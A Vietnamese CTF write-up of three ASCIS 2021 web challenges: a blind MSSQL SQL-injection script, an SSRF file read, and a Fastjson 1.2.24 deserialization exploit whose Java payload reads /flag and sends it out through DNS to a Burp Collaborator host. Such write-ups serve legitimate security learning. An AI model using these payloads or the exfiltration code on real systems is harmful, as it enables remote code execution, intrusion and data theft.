# ============= ASCIS 2021 - Quals =============  
<hr />  
  
## 1. script kiddie - 100pts  
  
Như mô tả ta có thể biết rằng web có chứa lỗ hổng SQL-injection với cơ sở dữ liệu được dùng ở đây là MSSQL.  
Câu query như sau: ` SELECT * FROM ... ORDER BY $sort ASC`  
Giá trị của biến `$sort` ta có thể control thông qua param `?sort=`  
Payload: `(case when (ascii(substring(db_name(),{index},1))={ord(c)}) then 1 else 1/db_name() end )`  
  
```python3  
import requests
from string import printable


url = 'http://167.172.85.253/web100/'
r = requests.Session()
db = ''
index = len(db) + 1

while True:
	for c in printable:
		#print("testing for " + c)
		payload = f'(case when (ascii(substring(db_name(),{index},1))={ord(c)}) then 1 else 1/db_name() end)'
		resp = r.get(url + '?sort=' + payload)
		if "Error" not in resp.text:
			db += c
			index += 1
			print(f"Length: {len(db)} - DB_NAME: {db}")
			break  
```  
![image](https://user-images.githubusercontent.com/44127534/137701975-53123d34-8aa2-4aa5-a045-d4bb27ac934d.png)  
> Flag: `ASICS{ssalchtiwesmihcueymorf}`  

## 2. OProxy - 400pts
  
Challege là một trang web có chức năng cho người dùng nhập vào một url và server trả về nội dung của trang web đó.  
![1](https://user-images.githubusercontent.com/44127534/137702153-809ef500-a4e6-49fa-b83e-4df111c5c777.png)
  
Dự đoán đây có thể tác giả ra thử thách ssrf. Fuzz các payload ssrf thì thấy được:  
![2](https://user-images.githubusercontent.com/44127534/137702202-a82f0e56-e27d-4629-a829-de987f526274.png)
  
Để ý server respose header Werkzeug/1.01 Python/3.10.0, có thể dự đoán được back-end có thể là flask, và có thể challenge được dựng trên docker, thử nhập url: file://127.0.0.1/app/main.py thì có được mã nguồn:  
  
![3](https://user-images.githubusercontent.com/44127534/137702301-c120d7c0-0606-44ab-8ab1-590538b0dd33.png)
  
Tới đây thì thử đọc file flag:  
![4](https://user-images.githubusercontent.com/44127534/137702338-414b7486-4fa5-4cf3-8864-4121a2d92ccc.png)
  
> Flag: `ASCIS{SSRF_M3mcached_inj3cti0n}`  

## 3. isolate - 475 pts  
  
Ở challenge này, đề bài có cung cấp cho ta source, cụ thể là có file `isolate.war` nên ta tiến hành giải nén và đọc các file `.class` bằng Intellij  
Phần xử lý chính nằm ở class `ISOServlet` có nội dung sau:  
![image](https://user-images.githubusercontent.com/44127534/137703459-7a027fbc-e3f4-4124-8c4a-09e50958d11e.png)
  
Server đọc chuỗi json qua `request.getInputStream()` và chặn những chuỗi json có chứa chuỗi `@type`, nếu mọi thứ ok thì sẽ đi qua hàm `JSON.parse(jsonData)`.  
Ở đây challenge sử dụng `Fastjson` phiên bản `1.2.24`  
![image](https://user-images.githubusercontent.com/44127534/137703786-2f6e1b65-3b82-46e0-9a5b-135325fe2989.png)  
    
Sau khi tìm google về `fastjson 1.2.24` thì thấy có khá nhiều bài nói về cách khai mà chủ yếu thông qua `autoType` do `fastjson` hỗ trợ được biểu diễn qua key là `@type`. Vì fastjson hỗ trợ việc sử dụng `autoType` này để khởi tạo một lớp cụ thể và gọi các phương thức set/get để truy cập các thuộc tính.  
  
Mà `@type` đã bị chặn bởi server vì do server lấy input dưới dạng stream nên ta có thể bypass dễ dàng qua unicode encode (cụ thể là `@\u0074ype`)  
Sau khi được BTC hint `BCEL / DBCP` thì team đã nhanh chóng google tìm được một [bài post](http://blog.nsfocus.net/fastjson-basicdatasource-attack-chain-0521/) về nó và kết hợp với [bài github](https://github.com/depycode/fastjson-local-echo) là đủ dữ kiện để khai thác.  
  
![image](https://user-images.githubusercontent.com/44127534/137706394-c7bffeb2-b16c-410a-995c-3f4f7ba94f9c.png)
  
Payload:  
```json
{
    {
        "@\u0074ype": "com.alibaba.fastjson.JSONObject",
        "x":{
                "@\u0074ype": "org.apache.tomcat.dbcp.dbcp2.BasicDataSource",
                "driverClassLoader": {
                    "@\u0074ype": "com.sun.org.apache.bcel.internal.util.ClassLoader"
                },
                "driverClassName": "<class dump>"
        }
    }: "x"
}
```  
Trong đó, `<class dump>` là các file `.class` đã được encode dạng `BCELEncode`. Ý tưởng đọc flag ở `/flag` sau đó encode dưới dạng `hex` sau đó dùng `Burp collaborator client` để lắng nghe DNS lookup và lấy flag.  
  
```
import javax.script.ScriptEngine;
import javax.script.ScriptEngineManager;
import javax.script.ScriptException;
import java.io.DataInputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.net.MalformedURLException;
import java.net.URL;
import java.net.URLConnection;
import java.nio.file.Files;
import java.nio.file.Paths;

public class Dummy {
    static {
        try {
            getFlag();
        } catch (Exception e) {
            e.printStackTrace();
        }

    }
    private static final char[] HEX_ARRAY = "0123456789ABCDEF".toCharArray();

    public static String byteArrayToHex(byte[] a) {
        StringBuilder sb = new StringBuilder(a.length * 2);
        for(byte b: a)
            sb.append(String.format("%02x", b));
        return sb.toString();
    }

    public static void leakFlag(String c) throws MalformedURLException {
        URL yahoo = new URL("http://"+c+".648yq47p874in51d8874eiy2vt1jp8.burpcollaborator.net");
        yahoo.hashCode();
    }

    public static void getFlag() throws Exception {
        try {
            byte[] dt = Files.readAllBytes(Paths.get("/flag"));
            leakFlag(byteArrayToHex(dt));

        } catch (MalformedURLException me) {
            System.out.println("MalformedURLException: " + me);
        } catch (IOException ioe) {
            System.out.println("IOException: " + ioe);
        }

    }

    public static void main(String[] args) {
        try {
            getFlag();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

}
```  
Command:  
```bash  
> $ javac Dummy.java
> $ java BCELEncode Dummy.class
```   
  
Final payload:  
```json
{
    {
        "@\u0074ype": "com.alibaba.fastjson.JSONObject",
        "x":{
                "@\u0074ype": "org.apache.tomcat.dbcp.dbcp2.BasicDataSource",
                "driverClassLoader": {
                    "@\u0074ype": "com.sun.org.apache.bcel.internal.util.ClassLoader"
                },
                "driverClassName": "$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$85U$dbV$dbF$U$dd$c26$SB$5cb$cc$r4$Q$924$d48$80$81$98K0$a55$E$g$8a$J$J$90$QJ$daT$b6$F6$91$zG$c8$U$f7$f6$d4$d5$P$e9$L$7d$y$edZ$e0$d5$ac$e4$D$fa$L$fd$91$3e5$dd$ps$c7Y$7d$f0$cc$e8$cc$cc$3e$fb$ec$d93$fe$eb$df$3f$df$C$88$e0G$V$3eDeL$a8$a8$c2$c7$K$se$7c$a2$e2S$c4T$5c$c1$94$IN$8b$e6$be$8c$Z$d1G$V$cc$w$f8L$85$8a$H$a2$99S$f0$b9$8cy$Vq$y$a8x$88E$V$b7$f0H4$8fe$y$d5$60$Z$x$K$9e$88$9dOU$ac$e2$99$8c5$F_$88$f9u$Z$cfUt$e2K$F_$89$5c$_j$Y$fcZ$86$$$a1$e6$c1$cc$b3$X$b1$a5$a5$d8$9a$84$aa$f5i$J$d5$T$99$5c$c6$99$94$e0$J$f6$3c$95$e0$9d$b6R$86$84$86x$sg$3c$yd$T$86$bd$a2$tLF$ea$TE$c7$88$d9$b6$5e$5c$b1$k$Y$bb$SZ$82$ebS$3d$f1$z$7dG$P$9bzn3$bc$ec$d8$99$dcfTB$dd$b2$a3$t_$$$e8yw$a7$8c$E$V$90$a0$98$86$fer$d6$d47$r4$H$_o$T$b9$d5$99$dd$a4$91w2Vn$5b$82$bci8b9Kea$q$96$d5397k$a5$cd$y$98$v$s$92$e6Q1$ea$b2U$b0$93$c6lFPW$ef$X$b2$d9b$bf$d8$a6$a1$h$lIh$bd$I1U$c8$98$v$c3$W$d3I$e6$ba$3d0$c4$K$hOW$z$s$b6$8c$a4$p$p$a5$c1$c0$86$86M$a45d$b0$a5$e1$rL$J$9a$bb2g8$e1$tKqrO$3bN$7e$3c$i$96$Q$e9$l$89$8c$V_EF$f3c$a3$91Lnx05$c6$81$91$v$O$ed8$83$5b$f9$b1$feD$c1$ce$t$z$d3$d4$T$96$ad$3b$96$ddO$Q$c1b$40C$W$ac$d7$X$dep5k$bc$c8X$86$a5$n$8fW2$c8z$h$dc$U$c2$j$Na$MH$e8$3c$a1$b3$a0$9b$h$96$9d5R$e4u$a2$ae$8c$82$86$j$7cC$j$w$ce$8fw$89$dave$U5$7c$x$f0$9a$5c$bc$8c$V$9e$5b$3cY$c4s$3e$f3$r$b6$M$Je$9bNy$9eLj$f8NL5$O$M$O$dd$8d$M$8f$8c$8e$dd$8bMM$df$9f$99$d5$f0$3d$7e$d0$f0$nn$b3N$f7$8c$84$t$a7$a8$7fpN$f8$a1$fe$Uk$8a$e6$a3$ae$3b$baY0$W7$98$sx$ce$7bb$9a$ce$ab$W$b5$e8$8e$84$7b$V$iv$d67$e5$e3$8cV$b4o$b5$9e$cf$h$b9$94$84$beJ6$bd$U$3ar$O7$w$8eU$OI$I$E$xB$xi$7d$3b$5d$be$60$bcms$c7j$e5$a8$ec$G$9d$g$7e$a4$3biZ$dfC$ebK$88$feO$N$e7$Z$9d$c3$88$5eB$W$X$81$c8$9am$e8$a9$98i$K$bd$f8$d9$W$ac$b4$b9G$i$c1Y$bf$V$b7$j$pKZV$81$b4$9a$e3$c7fx$c4$fc$OY$Yz6zA$ad$f7$ea$7b$aaVS$F$Y$9ep$5e$7c$99tWC$be$i$e7S$b2b$ebIJV$ebX$d3i$ddv$df$m$e1$91$9e$f5i$dc$e0$c3$e6$e3c$x$a1$5d$f8$88$a3j$8ey$c7$d9$G$f9$d5$c1$5eb$ef$L$jB$daw$X$f6$i$z$C$eaQ$p$$$cd$d1$d2$9f$Z$adf$l$7b$8d$aa$b5$d0$5b_$fa$Q$9exh$a1$f7$ed$a4g$c4$db$ec$ed$f8$F$b7$7b$9b$bdwG$7cw$fc$5e$ef$h$f8$d6$3c$cd$be$S$aa$97K$90$P$a0$ac$fe$e4$95$f6$de$fd$7d$e7$A5$bf$R$a4$caM$d3$e2rk$87$86$P$d0$85k$Ya$3fAN$bd$8c$b6$a2$ea$j$C$f0$c9$e8$93$d1$cfV$o$a5$7fH$bcF$dca$C$IN$b3$f0r$Et$bf$86$ba$sx$j$a2$d6$af1$5d$88$3f$7f$j$h$e6$3bD$7d$9cy$hVO$eb$ab$87$87$ed$N$s$bdIQna$90_$5e$ce$b5$Q$9d$d7$f4$I$fdW$ae$S$3a$y$fa$h$3dop$a5$E$7f$JM$f3$a1$S$C$r4$efa$7c$few$b4$k$tm$x$t$bd$ca$7c$Hh$dfC$c7$d9$c9k$e7$s$f7$5d$ca$BV$d8$e2$f6$RV$5d$d6$a3$9b$e9$c1$f4uL$l$40$3fW$84$d0$c6$D$Y$e48BU$86$d1$c7$ff$b9$BW$9fZxVe$dc$7d$$$pr$f5$84$7f$t$B$86$vc$f9$c4$e6$d8$8bTZ$J$j$7bP$84$I$d7$f7$dd$8a$3c$3c$c9$ces$87$Qal$94$d1a$c8$dc_$8b17$89$8c$aaY$Z$a3$5e$u$M$i$7b$e6$f1$91g$Ce$d8yVv$dd$dfu$80$h$7f$e0$e6$fb$e0$af0$W$60$d4O$c8$s$c2$b7$9e$87$e7$8b$e4$9ab$fc$3fag$V$f2$i$I$A$A"
        }
    }: "x"
}
```     
![image](https://user-images.githubusercontent.com/44127534/137708160-5ce7139e-c0a2-402b-aed4-c3d44ae1e332.png)
  
![image](https://user-images.githubusercontent.com/44127534/137708257-373db6d0-4b61-4248-ac62-227c89dd9934.png)
    
> Flag: `ASCIS{howaboutw/oDNS?:>}`    
